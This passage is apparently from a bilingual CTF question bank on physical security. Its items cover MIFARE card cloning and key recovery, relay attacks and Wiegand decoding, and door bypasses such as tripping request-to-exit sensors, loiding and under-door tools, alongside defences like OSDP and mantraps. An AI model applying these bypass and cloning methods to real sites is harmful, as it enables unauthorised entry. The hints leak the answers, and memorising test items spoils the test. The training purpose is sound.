      "en": "The Closing Byte"
    },
    "prompt": {
      "ko": "MIFARE Classic 블록 0에서 4바이트 UID 바로 뒤에는 UID 네 바이트를 모두 XOR 한 검사 바이트(BCC)가 온다. UID 가 `04A3B2C1` 일 때 BCC 를 16진수 두 자리로 구하라.",
      "en": "In MIFARE Classic block 0, the 4-byte UID is followed by a check byte (BCC) equal to the XOR of all four UID bytes. For UID `04A3B2C1`, give the BCC as two hex digits."
    },
    "hints": {
      "ko": [
        "0x04 ^ 0xA3 ^ 0xB2 ^ 0xC1.",
        "두 바이트씩 순서대로 XOR 해 나가면 된다: 04^A3 = A7, 그다음 ^B2, 그다음 ^C1."
      ],
      "en": [
        "0x04 XOR 0xA3 XOR 0xB2 XOR 0xC1.",
        "Fold left: 04^A3 = A7, then ^B2, then ^C1."
      ]
    }
  },
  {
    "id": "t2_crypto1",
    "tier": 2,
    "cat": "rfid",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "d6e28ce76102d571d5e6f00cfe76d9a0b693da780f0d34933bef834d598ca096",
    "fmt": "값 그대로 / literal (7글자 / 7 chars)",
    "title": {
      "ko": "48비트의 약속",
      "en": "A 48-Bit Promise"
    },
    "prompt": {
      "ko": "교통·출입에 널리 쓰인 MIFARE Classic 카드가 섹터 인증에 사용하는 스트림 암호의 이름은? 48비트 키와 예측 가능한 난수 발생기 탓에 논스 통계 기반 키 복구 공격으로 깨진다. (제품명 그대로, 7글자)",
      "en": "The stream cipher that the widely-deployed MIFARE Classic card uses for sector authentication. Its 48-bit key and predictable RNG let nonce-statistics key-recovery attacks break it. Give the name exactly. (7 characters)"
    },
    "hints": {
      "ko": [
        "영문 6글자 + 숫자 1자.",
        "NXP 가 만든 사유 알고리즘으로, 2008년 학계가 구조를 복원해 공개했다."
      ],
      "en": [
        "Six letters plus one digit.",
        "A proprietary NXP algorithm; academics reverse-engineered and published its structure in 2008."
      ]
    }
  },
  {
    "id": "t2_magic",
    "tier": 2,
    "cat": "rfid",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "6beec648e11826d4c218cc45a57bdbf865e15d6441ee9c5d58c924e0186bb40c",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "쓰기 금지가 풀린 카드",
      "en": "The Card With No Lock on Block 0"
    },
    "prompt": {
      "ko": "MIFARE Classic 카드를 완전히 복제하려면 보통 읽기 전용인 블록 0(UID 포함)까지 다시 써야 한다. 정품 카드는 이를 막지만, UID 블록 쓰기를 허용하도록 특별히 제작된 복제용 카드가 있다. 이 카드를 흔히 무엇이라 부르는가? (두 단어)",
      "en": "Fully cloning a MIFARE Classic card means rewriting block 0, which holds the UID and is normally read-only. Genuine cards forbid it, but special cloning cards are made that allow the UID block to be written. What are these commonly called? (two words)"
    },
    "hints": {
      "ko": [
        "gen1a·gen2 처럼 세대 구분이 있고, 값싼 중국산이 흔하다.",
        "Proxmark 의 블록 0 덮어쓰기 명령이 통하는 바로 그 카드다."
      ],
      "en": [
        "They come in generations like gen1a and gen2; cheap Chinese ones are common.",
        "It is the card on which Proxmark's block-0 overwrite command works."
      ]
    }
  },
  {
    "id": "t2_rex",
    "tier": 2,
    "cat": "lockpick",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "3227fe6bde46249b0aae4b69ef6efd806422a46788e281d050d32d0d9fbde723",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "나갈 때 열림",
      "en": "Opens On the Way Out"
    },
    "prompt": {
      "ko": "문 안쪽에 설치되어, 사람이 나가려 다가오면 움직임을 감지해 전자 잠금을 자동으로 푸는 센서가 있다. 문 아래 틈으로 얇은 철사나 냉각 스프레이를 넣어 바깥에서 오작동시킬 수 있다. 이 '퇴실 요청' 센서를 가리키는 세 글자 약어는?",
      "en": "A sensor mounted inside the door that detects someone approaching to leave and automatically releases the electronic lock. It can be tripped from outside by feeding a thin wire or a blast of cooling spray under the door. Give the three-letter acronym for this request-to-exit sensor."
    },
    "hints": {
      "ko": [
        "Request to EXit.",
        "보통 PIR(적외선) 방식이라 온도 변화에 반응한다."
      ],
      "en": [
        "Request to EXit.",
        "Usually a PIR unit, so it reacts to a change in temperature."
      ]
    }
  },
  {
    "id": "t2_piggyback",
    "tier": 2,
    "cat": "recon",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "00d7b7366f72734cf8da733e6cee0050de6b06c3ebf96be7f97fdefb637ebcf6",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "문 좀 잡아주세요",
      "en": "Hold the Door?"
    },
    "prompt": {
      "ko": "피해자가 자신이 뒤따르는 사람을 위해 문을 잡아주고 있다는 사실을 분명히 아는 상태에서 이루어지는 동반 진입 기법이다. 큰 상자를 든 배달원이 '양손이 꽉 차서요, 문 좀 잡아주실 수 있을까요?'라고 부탁하는 방식이 전형적이다. 이 기법의 이름은? (한 단어)",
      "en": "An accompanied-entry technique done with the victim fully aware they are holding the door for the person following them. The classic move is a delivery person with a big box asking, 'my hands are full, could you hold the door?' Name it. (one word)"
    },
    "hints": {
      "ko": [
        "누군가의 등에 업혀 간다는 뜻의 낱말이다.",
        "몰래 뒤따르는 방식보다 탐지 위험이 높다 — 피해자의 기억에 남기 때문."
      ],
      "en": [
        "The word means riding on someone's back.",
        "Detection risk is higher than the unnoticed variant because the victim remembers the encounter."
      ]
    }
  },
  {
    "id": "t2_loiding",
    "tier": 2,
    "cat": "lockpick",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "789b6df5bcceac40c9fee35a419f414fb24357a7a69ab037142c31943e6d1c3f",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "카드 한 장",
      "en": "Just a Card"
    },
    "prompt": {
      "ko": "빳빳한 플라스틱 카드를 문과 문틀 사이 틈에 밀어 넣고 경첩 반대 방향으로 눌러, 경사면을 가진 스프링식 래치볼트를 밀어 넘겨 여는 고전적인 우회 기법의 이름은? 영화에서 신용카드로 문을 여는 장면이 바로 이것이다. (한 단어)",
      "en": "Sliding a stiff plastic card into the gap between door and frame and pushing it toward the hinge side to force a bevelled spring latch bolt back. This is the 'open the door with a credit card' move from films. Name the technique. (one word)"
    },
    "hints": {
      "ko": [
        "'celluloid'(셀룰로이드)에서 온 낱말이라는 설이 있다.",
        "스프링이 없는 빗장에는 통하지 않는다."
      ],
      "en": [
        "The word is thought to derive from 'celluloid'.",
        "It does not work on a spring-less bolt."
      ]
    }
  },
  {
    "id": "t2_defaultkey",
    "tier": 2,
    "cat": "rfid",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "aada78153eebcd57a5f2bb70064da66636df01e521e427a0af3183ae33024044",
    "fmt": "16진수 / hex (12글자 / 12 chars)",
    "title": {
      "ko": "공장에서 나온 그대로",
      "en": "Straight From the Factory"
    },
    "prompt": {
      "ko": "MIFARE Classic 섹터마다 Key A / Key B 두 개의 6바이트 키가 있다. 배포된 카드가 바꾸지 않고 그대로 두는 경우가 흔한, 공장 출하 시의 기본 키 값을 16진수로 쓰라. (공백 없이 12글자)",
      "en": "Each MIFARE Classic sector holds a Key A and a Key B, six bytes each. Write the factory-default key value that deployed cards are so often left with unchanged, in hex. (12 characters, no spaces)"
    },
    "hints": {
      "ko": [
        "한 바이트를 여섯 번 반복한다.",
        "Proxmark `hf mf chk` 가 가장 먼저 시도하는 키다. 000000000000, A0A1A2A3A4A5 도 흔한 후보지만 '공장 기본'은 이것."
      ],
      "en": [
        "One byte repeated six times.",
        "It is the first key Proxmark's `hf mf chk` tries. 000000000000 and A0A1A2A3A4A5 are also common, but the factory default is this one."
      ]
    }
  },
  {
    "id": "t3_wiegandcn",
    "tier": 3,
    "cat": "rfid",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "83176a0c492ab1caa51b1df7210ec081afa95e8f4182d3c5dc051f5c25d6dc6b",
    "fmt": "숫자 / number",
    "title": {
      "ko": "26비트의 가운데",
      "en": "The Middle of 26 Bits"
    },
    "prompt": {
      "ko": "앞 문제와 같은 26비트 프레임이다:\n\n`01100011110111000000100111`\n\n[선행 패리티 1][시설 코드 8][카드 번호 16][후행 패리티 1] 구조에서, 이번에는 카드 번호(card number)를 십진수로 구하라.",
      "en": "The same 26-bit frame as before:\n\n`01100011110111000000100111`\n\nLayout [leading parity 1][facility code 8][card number 16][trailing parity 1]. This time give the card number as a base-ten number."
    },
    "hints": {
      "ko": [
        "선행 패리티 한 비트와 시설 코드 여덟 비트, 합쳐 앞의 아홉 비트를 건너뛰고 그다음 16비트를 읽는다.",
        "`1011100000010011` 을 십진수로 바꾼다."
      ],
      "en": [
        "Skip the leading parity bit and the eight facility-code bits — nine bits in all — then read the next sixteen.",
        "Convert `1011100000010011` to a base-ten number."
      ]
    }
  },
  {
    "id": "t3_hardnested",
    "tier": 3,
    "cat": "rfid",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "cf7808c645396213268a42b1689b767cbdf388f93c3a37dfb81e08930b305c63",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "아무것도 모를 때",
      "en": "When You Know Nothing"
    },
    "prompt": {
      "ko": "MIFARE Classic 카드에서 어떤 섹터 키도 알지 못할 때 쓰는 키 복구 공격이다. 나은 난수 발생기를 가진 후기 카드에도 통하며, 알려진 키 하나로 시작하는 가벼운 변종보다 훨씬 많은 논스를 수집해 통계적으로 키를 좁혀 나간다. 이 공격의 이름은? (한 단어)",
      "en": "The key-recovery attack for a MIFARE Classic card when not one sector key is known. It works even on later cards with a better RNG, collecting far more nonces than the lighter variant that starts from a known key, and narrowing the key statistically. Name it. (one word)"
    },
    "hints": {
      "ko": [
        "알려진 키로 시작하는 가벼운 변종의 이름 앞에, '어렵다'는 뜻의 영어 낱말이 붙는다.",
        "Proxmark 가 이 공격에 쓰는 서브커맨드 이름이 곧 정답이다."
      ],
      "en": [
        "It is the lighter, known-key variant's name with a word meaning 'difficult' stuck on the front.",
        "The Proxmark sub-command for this attack is the answer itself."
      ]
    }
  },
  {
    "id": "t3_relay",
    "tier": 3,
    "cat": "rfid",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "682fbae20f3428bcec4c117c57bea18d438c4758d972909b41dbe22884e0d6b8",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "먼 곳의 카드",
      "en": "A Card Far Away"
    },
    "prompt": {
      "ko": "한쪽 장치는 피해자 주머니 속 카드에, 다른 쪽 장치는 정품 리더(게이트)에 대고, 둘 사이의 카드 통신을 인터넷이나 블루투스로 실시간 중계한다. 그러면 카드가 도시 반대편에 있어도 리더는 '근접해 있다'고 믿는다. 근접 가정을 무너뜨리는 이 공격의 이름은? (한 단어)",
      "en": "One device is held to the card in the victim's pocket, another to the genuine reader at the gate, and the card's traffic is forwarded live between them over the internet or Bluetooth. The reader believes the card is close even when it is across the city. Name the attack that breaks the proximity assumption. (one word)"
    },
    "hints": {
      "ko": [
        "육상 계주에서 바통을 넘기는 그 낱말이다.",
        "방어책은 응답 왕복 시간을 재 근접을 검증하는 것, 그리고 UWB 측정이다."
      ],
      "en": [
        "The word is the one for passing a baton in a race.",
        "Defences time the response round trip to check closeness, plus UWB ranging."
      ]
    }
  },
  {
    "id": "t3_desfire",
    "tier": 3,
    "cat": "rfid",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "eead99bd6ca785bb0837ecf72b1f4be9cbed9e4aeabb638853c3486209cc066f",
    "fmt": "값 그대로 / literal",
    "title": {
      "ko": "권장 교체품",
      "en": "The Recommended Replacement"
    },
    "prompt": {
      "ko": "MIFARE Classic 을 대체하도록 권장되는 NXP 의 13.56 MHz 카드 제품군이다. AES-128 상호 인증을 사용하며 현재 알려진 실용적 취약점이 없다. EV1/EV2/EV3 세대가 있다. 이 제품군의 이름은? (제품명 그대로)",
      "en": "The NXP 13.56 MHz card family recommended in place of MIFARE Classic. It uses AES-128 mutual authentication and has no currently known practical weakness. Generations EV1/EV2/EV3 exist. Give the family name. (exact product name)"
    },
    "hints": {
      "ko": [
        "'MIFARE ___ EV3' 의 빈칸.",
        "DES 로 시작하지만 실제 암호는 AES 다 — 이름은 역사적 잔재."
      ],
      "en": [
        "The blank in 'MIFARE ___ EV3'.",
        "The name starts with DES but the cipher is AES; the name is a historical leftover."
      ]
    }
  },
  {
    "id": "t3_iclass",
    "tier": 3,
    "cat": "rfid",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "496fcf5e742df9f0814514758313fcc32095bab10b6c5421786764f5dbb11b55",
    "fmt": "값 그대로 / literal",
    "title": {
      "ko": "노출된 마스터 키",
      "en": "The Exposed Master Key"
    },
    "prompt": {
      "ko": "HID 의 13.56 MHz 카드 제품군으로, 초기 세대는 3DES 를 쓰고 카드 전체에 공통으로 적용되는 마스터 인증 키가 연구자들에게 추출되어 큰 논란이 되었다. 이후 더 새로운 세대로 대체를 권고받았다. 이 제품군의 이름은? (제품명 그대로)",
      "en": "The HID 13.56 MHz card family whose early generation used 3DES and whose card-wide master authentication key was extracted by researchers, a major controversy. HID later urged migration to its newer generations. Give the family name. (exact product name)"
    },
    "hints": {
      "ko": [
        "소문자 i 로 시작하는 여섯 글자.",
        "HID 의 순서에서 Prox 바로 다음이 이것이다."
      ],
      "en": [
        "Six letters, starts with a lowercase i.",
        "In HID's lineage this comes right after Prox."
      ]
    }
  },
  {
    "id": "t3_osdp",
    "tier": 3,
    "cat": "lockpick",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "fd48f5deb37199827d44c04b80efa2e8c431ee2b938234749ca050960af33e4c",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "평문 배선의 후계",
      "en": "Successor to the Plaintext Wire"
    },
    "prompt": {
      "ko": "카드 리더와 컨트롤러 사이의 고전 배선 규약이 암호화도 없고 단방향이며 도청·리플레이에 취약하다는 점을 해결하기 위해 SIA 가 표준화한 후계 프로토콜이다. RS-485 위에서 AES-128 로 보호되는 양방향 통신을 제공하고, 리더 상태 보고와 원격 설정도 지원한다. 이 표준의 약어는? (4글자)",
      "en": "The SIA-standardised successor to the classic reader-to-controller wiring, built to fix its lack of encryption, one-way nature and exposure to eavesdropping and replay. It offers AES-128-protected two-way communication over RS-485, plus reader status reporting and remote configuration. Give the four-letter acronym."
    },
    "hints": {
      "ko": [
        "Open Supervised Device Protocol.",
        "IEC 60839-11-5 로도 채택되었다."
      ],
      "en": [
        "Open Supervised Device Protocol.",
        "Also adopted as IEC 60839-11-5."
      ]
    }
  },
  {
    "id": "t3_rubberducky",
    "tier": 3,
    "cat": "recon",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "4a1c8278d61ee04cb77c534729b226540ce3d31a424ea7f7787a32876ec92dc8",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "키보드인 척",
      "en": "Pretends To Be a Keyboard"
    },
    "prompt": {
      "ko": "USB 저장장치처럼 생겼지만 꽂으면 운영체제에 키보드(HID)로 인식되어, 미리 적어 둔 키 입력을 사람보다 빠르게 자동으로 타이핑해 명령을 실행하는 Hak5 의 물리 침투 장비다. 이 장비의 이름은? (두 단어, 장난감 이름)",
      "en": "It looks like a USB drive, but plugged in it registers as a keyboard (HID) and types a pre-written keystroke payload faster than a person could, running commands. This is Hak5's physical-intrusion device. Name it. (two words, a toy's name)"
    },
    "hints": {
      "ko": [
        "욕조에 띄우는 노란 장난감.",
        "페이로드는 'Ducky Script' 라는 간단한 스크립트로 작성한다. 같은 제품군에 Bash Bunny, LAN Turtle 이 있다."
      ],
      "en": [
        "The yellow toy you float in a bath.",
        "Payloads are written in a small language called 'Ducky Script'. Siblings in the range are the Bash Bunny and LAN Turtle."
      ]
    }
  },
  {
    "id": "t3_udt",
    "tier": 3,
    "cat": "lockpick",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "3452df462642811f533aab3320644f938fef707baf69845935a7c7cdafdf90bd",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "문 밑으로",
      "en": "Under It Goes"
    },
    "prompt": {
      "ko": "문과 바닥 사이 틈으로 납작하고 긴 금속 리더를 밀어 넣고, 끝에 달린 갈고리로 안쪽 레버 핸들이나 퇴실 버튼을 걸어 당겨 여는 침투 도구가 있다. 상업용 유리문에서 특히 잘 통한다. 이 도구를 가리키는 세 글자 약어는?",
      "en": "A long flat metal leader is fed through the gap between door and floor, and a hook on its end catches the inside lever handle or exit button and pulls it. It works especially well on commercial glass doors. Give the three-letter acronym for this tool."
    },
    "hints": {
      "ko": [
        "Under Door Tool.",
        "방어책은 문 하단 씰(door bottom seal)과 레버를 문에서 멀리 두는 것."
      ],
      "en": [
        "Under Door Tool.",
        "Defences: a door bottom seal, and mounting the lever away from the door."
      ]
    }
  },
  {
    "id": "t3_evilmaid",
    "tier": 3,
    "cat": "physical",
    "track": "physical",
    "points": 200,
    "ci": true,
    "hash": "4def14799cbe0dfb0cbb43bbb2513211c3294bb18eb2f2337fc982fe959d625e",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "잠깐 자리를 비운 사이",
      "en": "While It Was Left Alone"
    },
    "prompt": {
      "ko": "호텔 방에 노트북을 두고 나간 짧은 시간 동안, 침입자가 부트로더나 펌웨어를 변조해 다음 부팅 때 디스크 암호 문구를 가로채는 백도어를 심는다. 물리 접근을 전제로 한 이 공격 유형을 흔히 무엇이라 부르는가? (두 단어)",
      "en": "In the brief window a laptop is left in a hotel room, an intruder tampers with the bootloader or firmware to plant a backdoor that captures the disk passphrase on the next boot. What is this physical-access attack class commonly called? (two words)"
    },
    "hints": {
      "ko": [
        "객실 청소를 가장한 위협을 빗댄 이름이다.",
        "방어책은 펌웨어 서명 검증과 TPM 측정 부팅, 그리고 기기를 시야 밖에 두지 않는 것."
      ],
      "en": [
        "The name pictures a threat disguised as room cleaning.",
        "Defences: verified firmware with TPM measured boot, and never leaving the device out of sight."
      ]
    }
  },
  {
    "id": "t4_wiegandflag",
    "tier": 4,
    "cat": "rfid",
    "track": "physical",
    "points": 250,
    "ci": false,
    "hash": "77af13bf37945b207c3d101a405d3733e1720c7382cc6fd8f36b190e1c13d90b",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "프레임 전체를 읽어라",
      "en": "Read the Whole Frame"
    },
    "prompt": {
      "ko": "리더 배선에서 잡아낸 또 다른 26비트 표준 프레임이다:\n\n`00111000000011010100001010`\n\n구조 [선행 패리티 1][시설 코드 8][카드 번호 16][후행 패리티 1]. 시설 코드와 카드 번호를 각각 10진수로 구해 `FLAG{FC<시설코드>_CN<카드번호>}` 형태로 제출하라. 예: 시설 코드 7, 카드 번호 42 → `FLAG{FC7_CN42}`.",
      "en": "Another 26-bit standard frame captured off the reader wiring:\n\n`00111000000011010100001010`\n\nLayout [leading parity 1][facility code 8][card number 16][trailing parity 1]. Read the facility code and card number in decimal and submit `FLAG{FC<facility>_CN<number>}`. Example: facility 7, number 42 -> `FLAG{FC7_CN42}`."
    },
    "hints": {
      "ko": [
        "인덱스 1~8 이 시설 코드, 인덱스 9~24 가 카드 번호.",
        "`01110000` 과 `0001101010000101` 를 각각 10진수로 바꾼다."
      ],
      "en": [
        "Indices 1-8 are the facility code, indices 9-24 the card number.",
        "Convert `01110000` and `0001101010000101` to decimal."
      ]
    }
  },
  {
    "id": "t4_impossible",
    "tier": 4,
    "cat": "physical",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "064886e835e259dbf6c62901fdc086cf3aeda2ebbfd72c07fd5558364d162bef",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "동시에 두 곳",
      "en": "Two Places at Once"
    },
    "prompt": {
      "ko": "복제된 배지는 원본과 똑같은 ID 를 전송한다. 그래서 출입 로그에서, 같은 배지가 걸어서 갈 수 없을 만큼 떨어진 두 리더에서 짧은 시간 안에 연달아 쓰인 패턴을 찾으면 복제를 탐지할 수 있다. 로그인 이상 탐지에서도 쓰이는, 이 패턴을 가리키는 두 단어짜리 용어는?",
      "en": "A cloned badge transmits the exact same ID as the original. So in access logs you can spot cloning by finding the same badge used at two readers too far apart to walk between in the time elapsed. Give the two-word term for this pattern, also used in login anomaly detection."
    },
    "hints": {
      "ko": [
        "형용사 + 명사. '갈 수 없는 ___'.",
        "안티패스백(anti-passback)은 이를 아예 막는 통제이고, 이 용어는 로그에서 그것을 탐지하는 신호를 가리킨다."
      ],
      "en": [
        "Adjective + noun: 'the ___ you cannot make'.",
        "Anti-passback is the control that prevents it; this term names the detection signal for it in logs."
      ]
    }
  },
  {
    "id": "t4_tailgatelog",
    "tier": 4,
    "cat": "physical",
    "track": "physical",
    "points": 250,
    "ci": false,
    "hash": "eec0714f9d2335f00468942c2a6a0a1bcb6f1602fe5c51494f091594044cd7c6",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "가장 바짝 붙은 자",
      "en": "The Closest Follower"
    },
    "prompt": {
      "ko": "데이터센터 출입 로그다. 열은 `시각,배지,도어,행위,간격(ms)`.\n\n```\n2024-01-15 09:01:00,EMP001,DOOR_A,ACCESS_GRANTED,0\n2024-01-15 09:01:02,UNKNOWN,DOOR_A,ACCESS_NO_BADGE,1800\n2024-01-15 09:05:30,EMP002,DOOR_B,ACCESS_GRANTED,0\n2024-01-15 09:07:45,EMP003,DOOR_C,ACCESS_GRANTED,0\n2024-01-15 09:07:47,UNKNOWN,DOOR_C,ACCESS_NO_BADGE,2100\n2024-01-15 09:15:00,EMP004,DOOR_A,ACCESS_GRANTED,0\n2024-01-15 09:15:01,INTRUDER_X7,DOOR_A,ACCESS_NO_BADGE,950\n2024-01-15 09:20:00,EMP005,DOOR_B,ACCESS_GRANTED,0\n```\n\n같은 도어에서 `ACCESS_GRANTED` 직후 `ACCESS_NO_BADGE` 가 이어지고 그 간격이 0보다 크고 3000ms 이하이면 테일게이팅이다. 그중 간격이 가장 짧은(가장 위험한) 침입자의 배지 값을 골라 `FLAG{TAILGATE_<배지>}` 로 제출하라.",
      "en": "A data-centre access log. Columns: `time,badge,door,action,gap_ms`.\n\n```\n2024-01-15 09:01:00,EMP001,DOOR_A,ACCESS_GRANTED,0\n2024-01-15 09:01:02,UNKNOWN,DOOR_A,ACCESS_NO_BADGE,1800\n2024-01-15 09:05:30,EMP002,DOOR_B,ACCESS_GRANTED,0\n2024-01-15 09:07:45,EMP003,DOOR_C,ACCESS_GRANTED,0\n2024-01-15 09:07:47,UNKNOWN,DOOR_C,ACCESS_NO_BADGE,2100\n2024-01-15 09:15:00,EMP004,DOOR_A,ACCESS_GRANTED,0\n2024-01-15 09:15:01,INTRUDER_X7,DOOR_A,ACCESS_NO_BADGE,950\n2024-01-15 09:20:00,EMP005,DOOR_B,ACCESS_GRANTED,0\n```\n\nA tailgate is an `ACCESS_NO_BADGE` that follows an `ACCESS_GRANTED` at the same door with a gap greater than 0 and at most 3000 ms. Take the intruder with the smallest (most dangerous) gap and submit `FLAG{TAILGATE_<badge>}`."
    },
    "hints": {
      "ko": [
        "세 건이 조건을 만족한다: 1800, 2100, 950 ms.",
        "배지 값을 대문자 그대로 넣는다."
      ],
      "en": [
        "Three rows qualify: gaps of 1800, 2100 and 950 ms.",
        "Use the badge value exactly, uppercase."
      ]
    }
  },
  {
    "id": "t4_prng",
    "tier": 4,
    "cat": "rfid",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "bffa23f772e18ab156e74f41cc1613b815966a9ae2639a9778a898728fb766da",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "예측되는 무작위",
      "en": "Predictable Randomness"
    },
    "prompt": {
      "ko": "MIFARE Classic 의 섹터 키 복구 공격이 성립하는 근본 원인은, 카드가 인증 때 보내는 논스가 진짜 무작위가 아니라 카드에 전원이 들어온 뒤 흐른 시간만으로 예측 가능하다는 데 있다. 이렇게 약하게 구현된 '난수 발생기'를 가리키는 네 글자 약어는?",
      "en": "The sector-key recovery attack on MIFARE Classic works fundamentally because the nonce the card sends during authentication is not truly random — it is predictable from nothing but the time elapsed since the card was powered on. Give the four-letter acronym for this weakly-implemented 'random number generator'."
    },
    "hints": {
      "ko": [
        "Pseudo-Random Number Generator.",
        "카드마다 전원 인가 시점의 상태로 초기화되므로 리더가 시점을 통제하면 논스도 통제된다."
      ],
      "en": [
        "Pseudo-Random Number Generator.",
        "It seeds from the power-on state, so a reader that controls timing controls the nonce."
      ]
    }
  },
  {
    "id": "t4_seos",
    "tier": 4,
    "cat": "rfid",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "d2b9a5fcbca8ab66c8d52875aa1d3723ff9c1597f945ee54993fac07e2e8aa58",
    "fmt": "값 그대로 / literal (4글자 / 4 chars)",
    "title": {
      "ko": "PKI 를 얹은 배지",
      "en": "A Badge With PKI"
    },
    "prompt": {
      "ko": "HID 의 최신 고보안 크리덴셜 기술로, AES-128 에 더해 공개키 기반구조(PKI)와 상호 인증을 결합하고 스마트폰 기반 배지도 지원한다. 고보안 시설에 권장되며 암호화 양방향 리더 프로토콜과 함께 쓰인다. 이 기술의 이름은? (제품명 그대로, 4글자)",
      "en": "HID's newest high-security credential technology: AES-128 plus a public-key infrastructure (PKI) and mutual authentication, with smartphone-based badges supported. Recommended for high-security sites and paired with the encrypted two-way reader protocol. Give the name. (exact product name, 4 characters)"
    },
    "hints": {
      "ko": [
        "네 글자, 소문자로 시작하는 제품명. HID 고보안 계열의 최상위.",
        "'Secure identity' 를 줄인 이름으로 읽힌다."
      ],
      "en": [
        "Four letters, product name starting lowercase; the top of HID's high-security lineage.",
        "It reads as a contraction of 'secure identity'."
      ]
    }
  },
  {
    "id": "t4_mantrap",
    "tier": 4,
    "cat": "physical",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "23d0694d329c22c83b0f2fbb6979d3f0ab8fdf5ca240b95a3b2051dddfcc6d20",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "한 번에 한 명",
      "en": "One at a Time"
    },
    "prompt": {
      "ko": "두 개의 문이 잇달아 있고, 앞문이 완전히 닫히고 잠긴 뒤에야 뒷문이 열리는 작은 통로 구조다. 그 사이 공간에서 배지와 체중을 확인해 한 번에 한 사람만 통과시켜, 뒤따라 들어오는 것을 물리적으로 차단한다. 이 구조의 이름은? (한 단어)",
      "en": "A small vestibule with two doors in series: the inner door opens only after the outer one has fully closed and locked. In the space between, the badge and the occupant's weight are checked so exactly one person passes at a time, physically blocking anyone from following through. Name this structure. (one word)"
    },
    "hints": {
      "ko": [
        "'사람을 가두는 덫' 이라는 뜻의 두 낱말을 붙여 쓴다.",
        "공항 보안 구역이나 데이터센터 입구에서 흔히 본다. 회전문(revolving door)도 같은 목적."
      ],
      "en": [
        "Two words meaning 'a trap for a person', written closed up.",
        "Common at airport security zones and data-centre entrances; a revolving door serves the same purpose."
      ]
    }
  },
  {
    "id": "t4_distbound",
    "tier": 4,
    "cat": "rfid",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "e8a23a7c23533320b4288a6d96b987dd8570e4ee60f76c99482c059db037d1be",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "왕복 시간을 재라",
      "en": "Time the Round Trip"
    },
    "prompt": {
      "ko": "카드 신호를 중계해 근접 가정을 깨는 공격을 막기 위한 프로토콜 계열이다. 리더가 카드에 challenge 를 보내고 응답이 돌아오기까지의 시간을 나노초 단위로 재서, 그 시간이 빛의 속도로 왕복 가능한 거리 이내인지 확인한다. 중계 장비가 끼면 지연이 늘어 탐지된다. 이 기법을 가리키는 두 단어짜리 용어는?",
      "en": "A family of protocols against the attack that forwards a card's signal to break the proximity assumption. The reader sends a challenge and times the response to the nanosecond, checking that the round trip is short enough for the signal to have travelled there and back at light speed. A forwarding device adds delay and is detected. Give the two-word term."
    },
    "hints": {
      "ko": [
        "명사 + 동명사: '거리 ___'.",
        "UWB(초광대역) 무선이 이를 하드웨어로 구현한 대표 사례다."
      ],
      "en": [
        "noun + gerund: '___ bounding'.",
        "UWB radio is the headline hardware implementation of it."
      ]
    }
  },
  {
    "id": "t4_ptes",
    "tier": 4,
    "cat": "recon",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "97342e4f868b426d49832c6e88baef24f0ff24fe0fb02e6949d0f2b99b1b2dbf",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "일곱 단계의 표준",
      "en": "The Seven-Phase Standard"
    },
    "prompt": {
      "ko": "이 트랙의 물리 침투 절차 — 사전 참여, 정찰, 침투 시도, 후속 행동, 보고 — 는 침투 테스트 전반을 일곱 단계로 정리한 공개 표준의 물리 도메인을 따른다. 사전 참여·정보 수집·위협 모델링·취약점 분석·익스플로잇·후속 행동·보고의 그 표준을 가리키는 네 글자 약어는?",
      "en": "This track's physical procedure — pre-engagement, reconnaissance, exploitation attempts, post-exploitation, reporting — follows the physical domain of an open standard that lays out penetration testing in seven phases: pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting. Give the four-letter acronym."
    },
    "hints": {
      "ko": [
        "Penetration Testing Execution Standard.",
        "OWASP 테스트 가이드나 OSSTMM 과는 다른 문서다."
      ],
      "en": [
        "Penetration Testing Execution Standard.",
        "A different document from the OWASP Testing Guide or OSSTMM."
      ]
    }
  },
  {
    "id": "t4_emdec",
    "tier": 4,
    "cat": "rfid",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "349531ea0fbdb12960612634a265f60b41e40f7d924e6b39f6e9db3e74431358",
    "fmt": "숫자 / number",
    "title": {
      "ko": "태그가 뱉은 숫자",
      "en": "The Number the Tag Spat Out"
    },
    "prompt": {
      "ko": "Proxmark `lf search` 가 EM4100 태그를 찾아 40비트 ID `1A2B3C4D5E` 를 출력했다. 이 ID 의 하위 32비트(마지막 8개 16진수 자리)를 10진수로 구하라.",
